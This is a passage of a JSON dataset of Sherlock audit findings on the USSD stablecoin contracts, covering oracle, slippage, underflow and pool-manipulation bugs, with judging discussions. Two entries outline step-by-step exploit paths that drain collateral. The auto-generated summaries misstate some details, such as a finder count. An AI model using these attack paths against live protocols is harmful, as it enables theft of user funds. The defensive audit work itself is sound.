      "summary": "\nThis bug report is about a rebalance process that can revert because of an underflow calculation. The rebalance process is triggered when the system tries to sell the collateral in case of a peg-down. The calculation of the asset to be sold (`amountToSellUnits`) is first calculated, then swapped to `baseAsset` via Uniswap. However, when subtracting `amountToBuyLeftUSD` with the result of `(IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore)`, there is no guarantee that `amountToBuyLeftUSD` will always be bigger than `(IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore)`, which can cause the call to revert. \n\nThis bug was found by 0xHati, Dug, GimelSec, Juntao, PokemonAuditSimulator, T1MOH, WATCHPUG, XDZIBEC, ast3ros, saidam017, toshii, tsvetanovv, and twicek. The code snippets related to this bug can be found at https://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/USSDRebalancer.sol#L116-L125 and https://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/USSDRebalancer.sol#L132-L138.\n\nThe impact of this bug is that the rebalance process can revert due to an underflow calculation. The recommended fix is to check if `(IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore)` is greater than `amountToBuyLeftUSD`, and if so, set `amountToBuyLeftUSD` to 0. The tool used to find this bug was manual review.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "USSD - Autonomous Secure Dollar",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-05-USSD-judging/issues/111",
      "tags": [],
      "finders": [
        "Juntao",
        "PokemonAuditSimulator",
        "toshii",
        "Dug",
        "twicek",
        "T1MOH",
        "WATCHPUG",
        "tsvetanovv",
        "saidam017",
        "0xHati",
        "XDZIBEC",
        "GimelSec",
        "ast3ros"
      ]
    },
    {
      "id": "19142",
      "title": "M-2: Because of missing slippage parameter, mintForToken() can be front-runned",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-05-USSD-judging/issues/97 \n\n## Found by \n0xRobocop, Aymen0909, GimelSec, Kose, cryptostellar5, qbs, shealtielanz\n## Summary\nMissing slippage parameter in ```mintForToken()``` makes it vulnerable to front-run attacks and exposes users to unwanted slippage.\n## Vulnerability Detail\nThe current implementation of the ```mintForToken()``` function lacks a parameter for controlling slippage, which makes it vulnerable to front-run attacks. Transactions involving large volumes are particularly at risk, as the minting process can be manipulated, resulting in price impact. This manipulation allows the reserves of the pool to be controlled, enabling a frontrunner to make the transferred token to appear more valuable than its actual worth. Consequently, when users mint USSD, they may receive USSD that are worth significantly less than the value of their real worth. This lack of slippage control resembles a swap without a limit on value manipulation.\n\n## Impact\nUser will be vulnerable to front-run attacks and receive less USSD from their expectation.\n## Code Snippet\n[USSD.sol#L150-L167](https://github.com/USSDofficial/ussd-contracts/blob/f44c726371f3152634bcf0a3e630802e39dec49c/contracts/USSD.sol#L150-L167)\n```solidity\n/// Mint specific AMOUNT OF STABLE by giving token\n    function mintForToken(\n        address token,\n        uint256 tokenAmount,\n        address to\n    ) public returns (uint256 stableCoinAmount) {\n        require(hasCollateralMint(token), \"unsupported token\");\n\n        IERC20Upgradeable(token).safeTransferFrom(\n            msg.sender,\n            address(this),\n            tokenAmount\n        );\n        stableCoinAmount = calculateMint(token, tokenAmount);\n        _mint(to, stableCoinAmount);\n\n        emit Mint(msg.sender, to, token, tokenAmount, stableCoinAmount);\n    }\n```\n## Tool used\n\nManual Review\n\n## Recommendation\nConsider adding a ```minAmountOut``` parameter.\n\n\n\n## Discussion\n\n**sherlock-admin**\n\n> Removed: comment left for traceability \n> I think this is not a valid medium. \n> As the mintForToken function uses oracle prices, which return a weighted average price, it should not be that easy manipulated by Frontrunning.\n\n    You've deleted an escalation for this issue.\n\n**kosedogus**\n\n> Escalate for 10USDC I think this is not a valid medium. As the mintForToken function uses oracle prices, which return a weighted average price, it should not be that easy manipulated by Frontrunning.\n\nWeighted average prices does not guarantee that trades (minting in this case)  executed based on the average price will be free from slippage. TWAP's are obviously vulnerable to slippage attacks. I also would like to remind that there is another valid issue due to the lack of slippage parameter in uniRouter. (That function also uses TWAP) \n\n**Shogoki**\n\nOkay, I think you are right.\nI removed the escalation",
      "summary": "\nA bug report has been filed for the missing slippage parameter in the ```mintForToken()``` function of the USSD contract. This lack of a parameter makes it vulnerable to front-run attacks, allowing a frontrunner to manipulate the reserves of the pool and make the transferred token appear more valuable than its actual worth. Consequently, users minting USSD may receive USSD that are worth significantly less than the value of their real worth. The issue was found by 0xRobocop, Aymen0909, GimelSec, Kose, cryptostellar5, qbs, and shealtielanz and was identified using manual review. \n\nThe recommended solution is to add a ```minAmountOut``` parameter. This would help protect users from front-run attacks and ensure that they receive the full value of USSD they were expecting. \n\nThe discussion around this issue included a comment from sherlock-admin that weighted average prices should be enough to prevent front-run attacks, to which kosedogus responded that weighted average prices do not guarantee that trades will be free from slippage. Shogoki then removed the escalation.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "USSD - Autonomous Secure Dollar",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-05-USSD-judging/issues/97",
      "tags": [
        "Front-Running"
      ],
      "finders": [
        "shealtielanz",
        "cryptostellar5",
        "Kose",
        "Aymen0909",
        "0xRobocop",
        "qbs",
        "GimelSec"
      ]
    },
    {
      "id": "19141",
      "title": "M-1: Calls to Oracles don't check for stale prices",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-05-USSD-judging/issues/31 \n\n## Found by \n0x2e, 0xHati, 0xPkhatri, 0xRobocop, 0xSmartContract, 0xStalin, 0xeix, 0xlmanini, 0xyPhilic, Angry\\_Mustache\\_Man, Aymen0909, Bauchibred, Bauer, Brenzee, BugBusters, Delvir0, DevABDee, Diana, Dug, Fanz, GimelSec, HonorLt, J4de, Kodyvim, Kose, Lilyjjo, Madalad, MohammedRizwan, Nyx, PNS, PTolev, Pheonix, PokemonAuditSimulator, Proxy, RaymondFam, Saeedalipoor01988, SaharDevep, SanketKogekar, Schpiel, T1MOH, TheNaubit, VAD37, WATCHPUG, \\_\\_141345\\_\\_, ast3ros, berlin-101, capy\\_, chainNue, chaithanya\\_gali, chalex.eth, ctf\\_sec, curiousapple, dacian, evilakela, georgits, giovannidisiena, immeas, josephdara, juancito, kiki\\_dev, kutugu, lil.eth, martin, ni8mare, nobody2018, pavankv241, peanuts, qbs, qckhp, saidam017, sakshamguruji, sam\\_gmk, sashik\\_eth, sayan\\_, shaka, shealtielanz, simon135, ss3434, tallo, theOwl, toshii, tsvetanovv, twicek, ustas, vagrant, w42d3n, warRoom, whiteh4t9527\n## Summary\nCalls to Oracles don't check for stale prices.\n\n## Vulnerability Detail\nNone of the oracle calls check for stale prices, for example [StableOracleDAI.getPriceUSD()](https://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/oracles/StableOracleDAI.sol#L48):\n```solidity\n(, int256 price, , , ) = priceFeedDAIETH.latestRoundData();\n\nreturn\n    (wethPriceUSD * 1e18) /\n    ((DAIWethPrice + uint256(price) * 1e10) / 2);\n```\n\n## Impact\nOracle price feeds can become stale due to a variety of [reasons](https://ethereum.stackexchange.com/questions/133242/how-future-resilient-is-a-chainlink-price-feed/133843#133843). Using a stale price will result in incorrect calculations in most of the key functionality of USSD & USSDRebalancer contracts.\n\n## Code Snippet\n[StableOracleDAI.getPriceUSD()](https://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/oracles/StableOracleDAI.sol#L48)\n[StableOracleWBGL.getPriceUSD()](https://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/oracles/StableOracleWBGL.sol#L36-L38)\n[StableOracleWBTC.getPriceUSD()](https://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/oracles/StableOracleWBTC.sol#L23-L25)\n[StableOracleWETH.getPriceUSD()](https://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/oracles/StableOracleWETH.sol#L23-L25)\n\n## Tool used\nManual Review\n\n## Recommendation\nRead the ``updatedAt`` parameter from the calls to ``latestRoundData()`` and verify that it isn't older than a set amount, eg:\n\n```solidity\nif (updatedAt < block.timestamp - 60 * 60 /* 1 hour */) {\n   revert(\"stale price feed\");\n}\n```",
      "summary": "\nA bug report has been issued on the USSD-Judging repository on Github. The bug was found by a team of 33 members, who identified that calls to Oracles don't check for stale prices. This means that the Oracle price feeds can become stale due to a variety of reasons, resulting in incorrect calculations in most of the key functionality of USSD & USSDRebalancer contracts. The bug was identified through manual review and the recommendation is to read the ``updatedAt`` parameter from the calls to ``latestRoundData()`` and verify that it isn't older than a set amount. If it is, the call should be reverted with the message \"stale price feed\". This bug should be addressed as soon as possible to ensure accuracy in the calculations of the key functionality of USSD & USSDRebalancer contracts.",
      "quality_score": 4,
      "rarity_score": 1,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "USSD - Autonomous Secure Dollar",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-05-USSD-judging/issues/31",
      "tags": [
        "Stale Price",
        "Oracle"
      ],
      "finders": [
        "J4de",
        "Dug",
        "0xSmartContract",
        "shaka",
        "nobody2018",
        "qbs",
        "lil.eth",
        "Delvir0",
        "giovannidisiena",
        "0xyPhilic",
        "juancito",
        "SaharDevep",
        "Pheonix",
        "MohammedRizwan",
        "BugBusters",
        "Angry\\_Mustache\\_Man",
        "PNS",
        "sam\\_gmk",
        "ss3434",
        "pavankv241",
        "Schpiel",
        "Lilyjjo",
        "VAD37",
        "shealtielanz",
        "qckhp",
        "capy\\_",
        "immeas",
        "Kose",
        "Kodyvim",
        "chalex.eth",
        "sayan\\_",
        "kutugu",
        "\\_\\_141345\\_\\_",
        "HonorLt",
        "curiousapple",
        "chainNue",
        "w42d3n",
        "Nyx",
        "WATCHPUG",
        "peanuts",
        "vagrant",
        "ctf\\_sec",
        "tallo",
        "saidam017",
        "RaymondFam",
        "Aymen0909",
        "0xRobocop",
        "sakshamguruji",
        "martin",
        "GimelSec",
        "ni8mare",
        "warRoom",
        "toshii",
        "0xPkhatri",
        "twicek",
        "T1MOH",
        "Brenzee",
        "georgits",
        "simon135",
        "Madalad",
        "theOwl",
        "Bauchibred",
        "PokemonAuditSimulator",
        "Proxy",
        "PTolev",
        "berlin-101",
        "Fanz",
        "0x2e",
        "chaithanya\\_gali",
        "evilakela",
        "sashik\\_eth",
        "TheNaubit",
        "0xStalin",
        "josephdara",
        "dacian",
        "SanketKogekar",
        "0xeix",
        "DevABDee",
        "tsvetanovv",
        "0xHati",
        "kiki\\_dev",
        "ast3ros",
        "Bauer",
        "Diana",
        "ustas",
        "0xlmanini",
        "whiteh4t9527",
        "Saeedalipoor01988"
      ]
    },
    {
      "id": "19140",
      "title": "H-11: Oracle price should be denominated in DAI instead of USD",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-05-USSD-judging/issues/909 \n\n## Found by \nT1MOH, WATCHPUG\n## Summary\n\n## Vulnerability Detail\n\nPer the whitepaper, USSD aims to be pegged to DAI.\n\nThe implementation of rebalancer is also using the DAI price of USSD (`getOwnValuation()`) as the target of the peg.\n\nHowever, all current oracles return the price denominated in USD.\n\nAdditionally, all collateral tokens can be used to mint at the oracle price with no fee.\n\nAs a result, when DAI is over-pegged, the system will automatically drive itself away from the peg to DAI. The proof of concept for this is as follows:\n\nWhen the DAI price is 1.1 (over-pegged), and the system is actively maintaining its peg to DAI, the user can:\n\n1. Mint 1100 USSD with 1000 DAI (worth 1100 USD).\n2. Sell 1100 USSD for 1100 DAI, driving the USSD to a lower price against DAI, say 1 USSD to 0.98 DAI.\n3. Trigger the `rebalance()` function which sells collateral to DAI and buys back USSD to push its price back to 1:1 with DAI.\n\nBy repeating steps 1-3, the system will consume all its collateral, and the profit will be extracted by the arbitrator.\n\n## Impact\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/oracles/StableOracleWETH.sol#L12-L27\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nChange the unit of Oracle price from USD to DAI.\n\n- DAI should return 1\n- WBTC should use WBTC/ETH ETH/DAI\n- WETH should use WETH/DAI\n- WBGL should use WBGL/WETH ETH/DAI\n\nOr, change the peg target from DAI to USD, which means the `getOwnValuation()` should not be used as the peg deviation check standard.\n\n\n\n## Discussion\n\n**0xJuancito**\n\nEscalate for 10 USDC\n\nThe report assumes that the attacker would be able to sell 1100 USSD for 1100 DAI:\n\n> 2. Sell 1100 USSD for 1100 DAI, driving the USSD to a lower price against DAI, say 1 USSD to 0.98 DAI.\n\nThis wouldn't be possible, as the USSD/DAI pool would be arbitraged and the attacker will only be losing money on each mint. It also assumes manipulating the price, which is already mentioned in https://github.com/sherlock-audit/2023-05-USSD-judging/issues/451.\n\nThis can be considered either informational or a duplicate\n\n**sherlock-admin**\n\n > Escalate for 10 USDC\n> \n> The report assumes that the attacker would be able to sell 1100 USSD for 1100 DAI:\n> \n> > 2. Sell 1100 USSD for 1100 DAI, driving the USSD to a lower price against DAI, say 1 USSD to 0.98 DAI.\n> \n> This wouldn't be possible, as the USSD/DAI pool would be arbitraged and the attacker will only be losing money on each mint. It also assumes manipulating the price, which is already mentioned in https://github.com/sherlock-audit/2023-05-USSD-judging/issues/451.\n> \n> This can be considered either informational or a duplicate\n\nYou've created a valid escalation for 10 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**ctf-sec**\n\nEmm do not see why this is not possible\n\n> Sell 1100 USSD for 1100 DAI, driving the USSD to a lower price against DAI, say 1 USSD to 0.98 DAI.\n\nthe attack path described is still valid in the original report\n\n**hrishibhat**\n\nResult:\nHigh\nHas duplicates\nThe attack is possible and the rebalance is design to create maintain the 1:1 ratio between USSD to DAI.\n\n**sherlock-admin**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [0xJuancito](https://github.com/sherlock-audit/2023-05-USSD-judging/issues/909/#issuecomment-1605924088): rejected",
      "summary": "\nThis bug report is about an issue in the implementation of a rebalancer in USSD which uses DAI as the target of the peg. The problem is that all current oracles return the price denominated in USD instead of DAI. This means that when DAI is over-pegged, the system will automatically drive itself away from the peg to DAI. The attack path described is still valid in the original report. \n\nThe code snippet referenced in the report is from the StableOracleWETH.sol file and can be found at https://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/oracles/StableOracleWETH.sol#L12-L27.\n\nThe impact of this bug is that when DAI is over-pegged, the system will automatically drive itself away from the peg to DAI. This can lead to the system consuming all its collateral and the profit will be extracted by the arbitrator.\n\nThe recommendation is to either change the unit of Oracle price from USD to DAI or change the peg target from DAI to USD. This means that the `getOwnValuation()` should not be used as the peg deviation check standard.\n\nThe issue was found by T1MOH and WATCHPUG and was reviewed manually. After discussion, the issue was resolved successfully with the escalations being rejected.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "USSD - Autonomous Secure Dollar",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-05-USSD-judging/issues/909",
      "tags": [],
      "finders": [
        "WATCHPUG",
        "T1MOH"
      ]
    },
    {
      "id": "19139",
      "title": "H-10: Wrong Oracle feed addresses",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-05-USSD-judging/issues/817 \n\n## Found by \n0xGusMcCrae, 0xHati, 0xPkhatri, 0xRobocop, 0xStalin, 0xeix, 0xlmanini, 0xyPhilic, 14si2o\\_Flint, ADM, Aymen0909, Bahurum, Bauchibred, Bauer, BenRai, Brenzee, BugHunter101, Delvir0, DevABDee, Dug, G-Security, GimelSec, HonorLt, J4de, JohnnyTime, Juntao, Kirkeelee, Kodyvim, Kose, Lilyjjo, Madalad, PNS, PTolev, PokemonAuditSimulator, Proxy, Saeedalipoor01988, SaharDevep, Schpiel, SensoYard, T1MOH, TheNaubit, Vagner, Viktor\\_Cortess, WATCHPUG, \\_\\_141345\\_\\_, ashirleyshe, ast3ros, berlin-101, blockdev, chainNue, chalex.eth, ck, ctf\\_sec, curiousapple, dacian, evilakela, giovannidisiena, immeas, innertia, juancito, kie, kiki\\_dev, kutugu, lil.eth, martin, mrpathfindr, neumo, ni8mare, nobody2018, peanuts, pengun, qpzm, ravikiran.web3, saidam017, sakshamguruji, sam\\_gmk, sashik\\_eth, shaka, shogoki, simon135, theOwl, the\\_endless\\_sea, toshii, twicek, ustas, whiteh4t9527\n## Summary\n\nWrong Oracle feed addresses will result in wrong prices.\n\n## Vulnerability Detail\n\nStableOracleWBTC.sol#L17 the address is not the BTC/USD feed address.\n\nStableOracleDAI.sol#L28, `DAIEthOracle` is wrong.\n\nStableOracleDAI.sol#L30, address for `ethOracle` is address zero (a hanging todo).\n\nStableOracleWBGL.sol#L19, the address for staticOracleUniV3 is wrong, the current one is actually the univ3 pool address.\n\n## Impact\n\nWrong prices for collateral assets.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/oracles/StableOracleWBTC.sol#L8-L28\n\nhttps://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/oracles/StableOracleDAI.sol#L23-L31\n\nhttps://github.com/USSDofficial/ussd-contracts/blob/f44c726371f3152634bcf0a3e630802e39dec49c/contracts/oracles/StableOracleWBGL.sol#L17-L22\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nUse correct addresses.",
      "summary": "\nThis bug report is about the wrong Oracle feed addresses in the StableOracleWBTC.sol, StableOracleDAI.sol, and StableOracleWBGL.sol files. These addresses, if not corrected, will result in wrong prices for collateral assets. A manual review was conducted by 0xGusMcCrae, 0xHati, 0xPkhatri, 0xRobocop, 0xStalin, 0xeix, 0xlmanini, 0xyPhilic, 14si2o_Flint, ADM, Aymen0909, Bahurum, Bauchibred, Bauer, BenRai, Brenzee, BugHunter101, Delvir0, DevABDee, Dug, G-Security, GimelSec, HonorLt, J4de, JohnnyTime, Juntao, Kirkeelee, Kodyvim, Kose, Lilyjjo, Madalad, PNS, PTolev, PokemonAuditSimulator, Proxy, Saeedalipoor01988, SaharDevep, Schpiel, SensoYard, T1MOH, TheNaubit, Vagner, Viktor_Cortess, WATCHPUG, __141345__, ashirleyshe, ast3ros, berlin-101, blockdev, chainNue, chalex.eth, ck, ctf_sec, curiousapple, dacian, evilakela, giovannidisiena, immeas, innertia, juancito, kie, kiki_dev, kutugu, lil.eth, martin, mrpathfindr, neumo, ni8mare, nobody2018, peanuts, pengun, qpzm, ravikiran.web3, saidam017, sakshamguruji, sam_gmk, sashik_eth, shaka, shogoki, simon135, theOwl, the_endless_sea, toshii, twicek, ustas, whiteh4t9527. The wrong addresses were found in the following lines in the code snippet: StableOracleWBTC.sol#L17, StableOracleDAI.sol#L28, StableOracleDAI.sol#L30, and StableOracleWBGL",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "USSD - Autonomous Secure Dollar",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-05-USSD-judging/issues/817",
      "tags": [
        "Oracle",
        "Configuration"
      ],
      "finders": [
        "J4de",
        "Dug",
        "shaka",
        "nobody2018",
        "lil.eth",
        "Delvir0",
        "giovannidisiena",
        "Juntao",
        "0xyPhilic",
        "juancito",
        "the\\_endless\\_sea",
        "SaharDevep",
        "PNS",
        "sam\\_gmk",
        "Schpiel",
        "Kirkeelee",
        "Lilyjjo",
        "ADM",
        "SensoYard",
        "ashirleyshe",
        "immeas",
        "Viktor\\_Cortess",
        "BugHunter101",
        "G-Security",
        "Kose",
        "Kodyvim",
        "kie",
        "chalex.eth",
        "mrpathfindr",
        "kutugu",
        "\\_\\_141345\\_\\_",
        "HonorLt",
        "curiousapple",
        "chainNue",
        "innertia",
        "blockdev",
        "WATCHPUG",
        "peanuts",
        "JohnnyTime",
        "ctf\\_sec",
        "saidam017",
        "Vagner",
        "Aymen0909",
        "0xRobocop",
        "sakshamguruji",
        "martin",
        "neumo",
        "GimelSec",
        "ni8mare",
        "toshii",
        "0xPkhatri",
        "twicek",
        "T1MOH",
        "Brenzee",
        "Bahurum",
        "simon135",
        "Madalad",
        "theOwl",
        "Bauchibred",
        "PokemonAuditSimulator",
        "Proxy",
        "PTolev",
        "berlin-101",
        "ravikiran.web3",
        "pengun",
        "0xGusMcCrae",
        "shogoki",
        "evilakela",
        "sashik\\_eth",
        "TheNaubit",
        "BenRai",
        "ck",
        "0xStalin",
        "qpzm",
        "dacian",
        "0xeix",
        "14si2o\\_Flint",
        "DevABDee",
        "0xHati",
        "kiki\\_dev",
        "ast3ros",
        "Bauer",
        "ustas",
        "0xlmanini",
        "whiteh4t9527",
        "Saeedalipoor01988"
      ]
    },
    {
      "id": "19138",
      "title": "H-9: Uniswap v3 pool token balance proportion does not necessarily correspond to the price, and it is easy to manipulate.",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-05-USSD-judging/issues/808 \n\n## Found by \n0xRan4212, Bahurum, VAD37, WATCHPUG, curiousapple, mahdikarimi, n33k, nobody2018, simon135\n## Summary\n\n`getSupplyProportion()` retrieves Uniswap v3 pool balances, but the proportion of pool tokens doesn't always correspond to the price. If `ownval` is less than `1e6 - threshold`, `USSDamount` may be lower than `DAIamount`, causing L97 `USSDamount - DAIamount` to revert due to underflow. Proportion can be easily manipulated, which can be exploited by attackers.\n\n## Vulnerability Detail\n\n`getSupplyProportion()` retrieves the balances of the Uniswap v3 pool. However, due to the different designs of Uniswap v3 and Uniswap v2, the proportion of pool tokens does not necessarily correspond to the price.\n\nAs a result, if `ownval` is less than `1e6 - threshold` (e.g. 0.95), `USSDamount` may be lower than `DAIamount`, causing L97 `USSDamount - DAIamount` to revert due to underflow.\n\nAdditionally, the pool contract holds accumulative fees on its balances, which are not impacted by price changes.\n\n---\n\nFurthermore, the proportion can be easily manipulated with minimal cost, which can be exploited by attackers.\n\nIf the price of USSD goes over-peg (which can happen naturally), an attacker can take advantage by following these steps:\n\n1. Add single leg liquidity of DAI to the DAI/USSD pool at an exorbitantly high price range, such as 1 DAI == 1000-2000 USSD.\n2. Manipulate the price of the collateral asset, such as WETH, to a higher price.\n3. Place a limit-order like JIT liquidity at a higher price in the WETH/DAI pool.\n4. Trigger `rebalance() -> SellUSSDBuyCollateral()`, but it will mint and sell much more than expected (the amount needed to bring the peg back) as the `DAIamount` is significantly higher than `USSDamount` at a manipulated high price. This will buy the limit order from step 3.\n5. Reverse the price of WETH/DAI and remove the liquidity placed at step 1.\n\n## Impact\n\n1. `rebalance()` may malfunction if the proportion is not as expected.\n2. Manipulating the proportion can result in the protocol selling a significantly larger amount of collateral assets than intended. If the collateral asset is also manipulated, it would be sold at a manipulated price, causing even larger damage to the protocol.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/USSDRebalancer.sol#L13-L16\n\nhttps://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/USSDRebalancer.sol#L83-L107\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nInstead of using the pool balances to calculate the delta amount required to restore the peg, a more complex formula that considers the liquidity range should be used.\n\n\n\n## Discussion\n\n**0xJuancito**\n\nEscalate for 10 USDC\n\nThis issue is already addressed on #451 and its duplicates\n\nAll of them refer to manipulation of Uniswap v3 pool and calling `rebalance()` to manipulate USSD price. Other duplicate findings address the same issue as here with `getSupplyProportion ()` as well, like https://github.com/sherlock-audit/2023-05-USSD-judging/issues/92, https://github.com/sherlock-audit/2023-05-USSD-judging/issues/731, https://github.com/sherlock-audit/2023-05-USSD-judging/issues/733 just to give some examples.\n\n**sherlock-admin**\n\n > Escalate for 10 USDC\n> \n> This issue is already addressed on #451 and its duplicates\n> \n> All of them refer to manipulation of Uniswap v3 pool and calling `rebalance()` to manipulate USSD price. Other duplicate findings address the same issue as here with `getSupplyProportion ()` as well, like https://github.com/sherlock-audit/2023-05-USSD-judging/issues/92, https://github.com/sherlock-audit/2023-05-USSD-judging/issues/731, https://github.com/sherlock-audit/2023-05-USSD-judging/issues/733 just to give some examples.\n\nYou've created a valid escalation for 10 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**bahurum**\n\nEscalate for 10 USDC\n\nThis isssue  is not a duplicate of #451 as claimed by @0xJuancito.\n\nThe problem here is not the usage of `slot0()` but calculating the price of a Uniswap V3 pool as ratio of pool reserves, which is fundamentally wrong.\nAlso, while this issue allows an attack vector which involves manipulation of the price of the pool, the issue already exists without manipulation as the rebalancing will be completely off or would not work at all, and this for any normal non-manipulated pool.\n\n\n**sherlock-admin**\n\n > Escalate for 10 USDC\n> \n> This isssue  is not a duplicate of #451 as claimed by @0xJuancito.\n> \n> The problem here is not the usage of `slot0()` but calculating the price of a Uniswap V3 pool as ratio of pool reserves, which is fundamentally wrong.\n> Also, while this issue allows an attack vector which involves manipulation of the price of the pool, the issue already exists without manipulation as the rebalancing will be completely off or would not work at all, and this for any normal non-manipulated pool.\n> \n\nYou've created a valid escalation for 10 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**0xJuancito**\n\nEscalate for 10 USDC\n\nFor clarification from my previous comment, I'm pointing that many issues have been judged as a duplicate of #451 as stated on my comment due to this root cause as well, not necessarily with `slot0`, but the current use of the pool.\n\n> This issue is already addressed on https://github.com/sherlock-audit/2023-05-USSD-judging/issues/451 and its duplicates\n\nJust to give some examples:\n\n- https://github.com/sherlock-audit/2023-05-USSD-judging/issues/731\n\n> getSupplyProportion uses Uniswap V3 pool tokens balances which are easily manipulated. The protocol rebalances the USSD/DAI token proportion to 50/50 to rebalance the USSD/DAI price. This works for Uniswap V2 pools but does not work for Uniswap V3 pools.\n\n- https://github.com/sherlock-audit/2023-05-USSD-judging/issues/733\n\n> The getSupplyProportion() function, using the balanceOf() function, is designed to maintain the balance of the USSD/DAI pool in order to stabilize the USSD value at $1.\n\n> However, this balance can be manipulated, particularly through UniswapPool flashloan, which facilitates the alteration of the balanceOf() value of both USSD and DAI in the pool. This then tricks the USSDRebalancer.rebalance() function into swapping half the total pool value.\n\nMy suggestion is to keep the consistency in the judging and group them all, as similar issues have been already grouped under #451.\n\n**sherlock-admin**\n\n > Escalate for 10 USDC\n> \n> For clarification from my previous comment, I'm pointing that many issues have been judged as a duplicate of #451 as stated on my comment due to this root cause as well, not necessarily with `slot0`, but the current use of the pool.\n> \n> > This issue is already addressed on https://github.com/sherlock-audit/2023-05-USSD-judging/issues/451 and its duplicates\n> \n> Just to give some examples:\n> \n> - https://github.com/sherlock-audit/2023-05-USSD-judging/issues/731\n> \n> > getSupplyProportion uses Uniswap V3 pool tokens balances which are easily manipulated. The protocol rebalances the USSD/DAI token proportion to 50/50 to rebalance the USSD/DAI price. This works for Uniswap V2 pools but does not work for Uniswap V3 pools.\n> \n> - https://github.com/sherlock-audit/2023-05-USSD-judging/issues/733\n> \n> > The getSupplyProportion() function, using the balanceOf() function, is designed to maintain the balance of the USSD/DAI pool in order to stabilize the USSD value at $1.\n> \n> > However, this balance can be manipulated, particularly through UniswapPool flashloan, which facilitates the alteration of the balanceOf() value of both USSD and DAI in the pool. This then tricks the USSDRebalancer.rebalance() function into swapping half the total pool value.\n> \n> My suggestion is to keep the consistency in the judging and group them all, as similar issues have been already grouped under #451.\n\nYou've created a valid escalation for 10 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**ctf-sec**\n\nConsider this not a duplicate of #451 \n\nand will redo some duplicate later\n\n**0xRan4212**\n\nEscalate for 10 USDC\n\nhttps://github.com/sherlock-audit/2023-05-USSD-judging/issues/931 is a dup of this issue.\n\n**hrishibhat**\n\nResult:\nHigh\nHas duplicates\nThis issue is not a duplicate of #451, some of the duplications are changed accordingly. \n\n**sherlock-admin**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [0xJuancito](https://github.com/sherlock-audit/2023-05-USSD-judging/issues/808/#issuecomment-1605929297): accepted\n- [bahurum](https://github.com/sherlock-audit/2023-05-USSD-judging/issues/808/#issuecomment-1605947205): accepted\n- [0xJuancito](https://github.com/sherlock-audit/2023-05-USSD-judging/issues/808/#issuecomment-1606170316): accepted",
      "summary": "\nThis bug report is about an issue found in Uniswap v3 pool, which is a decentralized exchange for trading tokens. The issue is that the proportion of pool tokens does not necessarily correspond to the price, and it is easy to manipulate. This can be exploited by attackers, as they can manipulate the proportion to buy or sell tokens at a manipulated price. \n\nThe root cause of the issue is the `getSupplyProportion()` function, which retrieves the balances of the Uniswap v3 pool. If `ownval` is less than `1e6 - threshold`, `USSDamount` may be lower than `DAIamount`, causing L97 `USSDamount - DAIamount` to revert due to underflow.\n\nThe impact of this issue is twofold: 1) `rebalance()` may malfunction if the proportion is not as expected, and 2) manipulating the proportion can result in the protocol selling a significantly larger amount of collateral assets than intended, at a manipulated price.\n\nA code snippet is provided to demonstrate the issue, and the tool used to find this issue was Manual Review. The recommendation is to use a more complex formula that considers the liquidity range to calculate the delta amount required to restore the peg.\n\nThe issue has been escalated for 10 USDC, and it has been determined that this issue is not a duplicate of #451 as claimed by @0xJuancito. The issue has been accepted by @0xJuancito, @bahurum, and @0xJuancito.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "USSD - Autonomous Secure Dollar",
